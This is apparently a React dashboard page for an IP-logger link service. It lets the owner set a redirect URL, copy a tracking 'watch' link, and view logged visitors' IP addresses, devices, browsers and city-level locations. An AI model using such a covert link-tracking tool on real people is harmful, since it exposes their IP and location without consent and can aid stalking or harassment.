import { useEffect, useState } from "react";
import { useParams } from "react-router-dom";
import axios from "axios";
import { data } from "../components/config";
import { Copy, Edit3, Check } from "lucide-react";

interface Log {
  _id: string;
  IP_Address: string;
  UserAgent: string;
  device: string;
  os: string;
  browser: string;
  method: string;
  endpoint: string;
  date: string;
  location: { country: string | null; region: string | null; city: string | null };
}

interface LoggerData {
  _id: string;
  redicertUrl: string;
  Logs: Log[];
  createdAt: string;
}

export default function Watcher() {
  const { id } = useParams();
  const [logger, setLogger] = useState<LoggerData | null>(null);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [editUrl, setEditUrl] = useState("");
  const [saving, setSaving] = useState(false);

  const fetchLogger = async () => {
    if (!id) return;
    setLoading(true);
    setError("");
    try {
      const res = await axios.post(
        `${data.api}/api/logger/get`,
        { loggerId: id },
        { withCredentials: true }
      );
      setLogger(res.data.message);
      setEditUrl(res.data.message.redicertUrl);
    } catch (err: any) {
      setError(err.response?.data?.message || "Something went wrong");
    }
    setLoading(false);
  };

  useEffect(() => {
    fetchLogger();
    const interval = setInterval(fetchLogger, 29000);
    return () => clearInterval(interval);
  }, [id]);

  const handleSaveUrl = async () => {
    if (!logger) return;
    if (!editUrl) {
      setError("Logger ID and RedicertUrl are required.");
      return;
    }
    setSaving(true);
    try {
      await axios.post(
        `${data.api}/api/logger/edit`,
        { loggerId: logger._id, redicertUrl: editUrl },
        { withCredentials: true }
      );
      fetchLogger();
    } catch (err: any) {
      setError(err.response?.data?.message || "Failed to update URL");
    }
    setSaving(false);
  };

  if (loading) return <div className="p-6 text-white">Loading...</div>;
  if (error) return <div className="p-6 text-red-400 text-center">{error}</div>;
  if (!logger) return <div className="p-6 text-white">No data found.</div>;

  return (
    <div className="min-h-screen bg-[#0f172a] text-slate-100 relative overflow-hidden flex items-center justify-center p-4">
      <div className="absolute inset-0 z-0 pointer-events-none">
        <div className="absolute inset-0 bg-[linear-gradient(to_right,#1e293b_1px,transparent_1px),linear-gradient(to_bottom,#1e293b_1px,transparent_1px)] bg-[size:4rem_4rem] opacity-20" />
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-full h-[500px] bg-brand-900/20 blur-[120px] rounded-full" />
      </div>

      <div className="relative z-10 w-full max-w-5xl bg-slate-900/80 backdrop-blur-xl border border-slate-700 rounded-2xl shadow-2xl overflow-hidden p-6 space-y-6">

        <div className="flex flex-col md:flex-row md:justify-between items-start md:items-center gap-4">
          <div>
            <h1 className="text-2xl font-bold text-white">Logger: {logger._id}</h1>
            <p className="text-slate-400">Created at: {new Date(logger.createdAt).toLocaleString()}</p>
          </div>
          <div className="flex gap-2 items-center">
            <input
              type="text"
              value={editUrl}
              onChange={(e) => setEditUrl(e.target.value)}
              placeholder="Redirect URL"
              className="bg-slate-900/50 rounded-lg border border-slate-700 px-3 py-2 text-slate-100 focus:border-brand-500 focus:ring-2 focus:ring-brand-500/20 outline-none w-64"
            />
            <button
              onClick={handleSaveUrl}
              disabled={saving}
              className="bg-gradient-to-r from-brand-500 to-purple-500 hover:from-purple-500 hover:to-emerald-500 px-4 py-2 rounded-lg font-medium flex items-center gap-2"
            >
              {saving ? "Saving..." : "Save URL"} {saving ? <Check className="h-4 w-4"/> : <Edit3 className="h-4 w-4"/>}
            </button>
          </div>
        </div>

        <div>
          <span className="text-slate-400 mr-2">Copy Watch URL:</span>
          <input
            type="text" title="X"
            readOnly
            value={`${window.location.origin}/x/${logger._id}`}
            className="bg-slate-800 px-2 py-1 rounded-lg w-64 cursor-pointer text-sm text-slate-200"
            onClick={() => navigator.clipboard.writeText(`${window.location.origin}/x/${logger._id}`)}
          />
        </div>

        <div className="overflow-x-auto rounded-lg border border-slate-700">
          <table className="w-full text-left">
            <thead className="bg-slate-800">
              <tr>
                <th className="px-3 py-2 border border-slate-700">#</th>
                <th className="px-3 py-2 border border-slate-700">IP</th>
                <th className="px-3 py-2 border border-slate-700">Device</th>
                <th className="px-3 py-2 border border-slate-700">OS</th>
                <th className="px-3 py-2 border border-slate-700">Browser</th>
                <th className="px-3 py-2 border border-slate-700">Location</th>
                <th className="px-3 py-2 border border-slate-700">Method</th>
                <th className="px-3 py-2 border border-slate-700">Endpoint</th>
                <th className="px-3 py-2 border border-slate-700">Date</th>
              </tr>
            </thead>
            <tbody>
              {logger.Logs.map((log, i) => (
                <tr key={log._id} className="even:bg-slate-900/50 hover:bg-slate-700">
                  <td className="px-3 py-1 border border-slate-700">{i + 1}</td>
                  <td className="px-3 py-1 border border-slate-700">{log.IP_Address}</td>
                  <td className="px-3 py-1 border border-slate-700">{log.device}</td>
                  <td className="px-3 py-1 border border-slate-700">{log.os}</td>
                  <td className="px-3 py-1 border border-slate-700">{log.browser}</td>
                  <td className="px-3 py-1 border border-slate-700">
                    {log.location.city || "-"}, {log.location.region || "-"}, {log.location.country || "-"}
                  </td>
                  <td className="px-3 py-1 border border-slate-700">{log.method}</td>
                  <td className="px-3 py-1 border border-slate-700">{log.endpoint}</td>
                  <td className="px-3 py-1 border border-slate-700">{new Date(log.date).toLocaleString()}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </div>
  );
}